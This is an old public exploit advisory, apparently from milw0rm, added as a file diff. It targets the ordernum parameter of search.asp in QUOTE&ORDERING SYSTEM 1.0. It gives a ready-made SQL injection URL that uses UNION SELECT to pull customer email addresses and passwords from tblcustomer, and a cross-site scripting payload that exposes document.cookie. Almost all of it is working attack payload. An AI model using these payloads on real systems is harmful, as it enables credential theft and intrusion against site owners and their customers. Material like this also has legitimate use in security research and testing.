@@ -1,0 +1,42 @@
+*******************************************************************************
+# Title   :  QUOTE&ORDERING SYSTEM 1.0 (ordernum) Multiple Vulnerabilities
+# Author  :  ajann
+# Contact :  :(
+# S.Page  :  ...
+# $$      :  $250.00
+
+*******************************************************************************
+
+[[SQL]]]---------------------------------------------------------
+
+Register & Login Before Injection..
+
+
+http://[target]/[path]//search.asp?ordernum=[SQL]
+
+Example:
+
+//search.asp?ordernum=1+union+select+cemail,0,0,cpassword,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+from+tblcustomer&designname=&date=&statusid=statusid%3C%3E0&btnser=Search+Now
+
+[[/SQL]]
+
+[[XSS]]]---------------------------------------------------------
+
+Register & Login Before Injection..
+
+
+http://[target]/[path]//search.asp?ordernum=[XSS]
+
+Example:
+
+//search.asp?ordernum=%3Cscript%3EJavaScript%3Aalert%28document.cookie%29%3B%3C%2Fscript%3E&designname=&date=&statusid=statusid%3C%3E0&btnser=Search+Now
+
+[[/XSS]]
+
+"""""""""""""""""""""
+# ajann,Turkey
+# ...
+
+# Im not Hacker!
+
+# milw0rm.com [2007-01-05]
